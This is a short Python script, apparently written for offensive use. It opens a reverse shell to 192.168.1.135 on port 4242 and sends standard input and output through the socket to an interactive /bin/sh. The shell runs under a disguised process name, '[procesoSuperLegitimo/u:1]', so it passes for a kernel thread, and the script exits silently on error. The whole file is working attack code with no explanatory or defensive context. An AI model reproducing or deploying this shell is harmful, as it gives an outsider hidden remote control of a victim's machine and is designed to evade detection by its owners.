import socket
import os
IP = "192.168.1.135"
PORT = 4242
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, PORT))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    args = ["[procesoSuperLegitimo/u:1]", "-i"]
    os.execv("/bin/sh", args)
except Exception:
    exit(0)

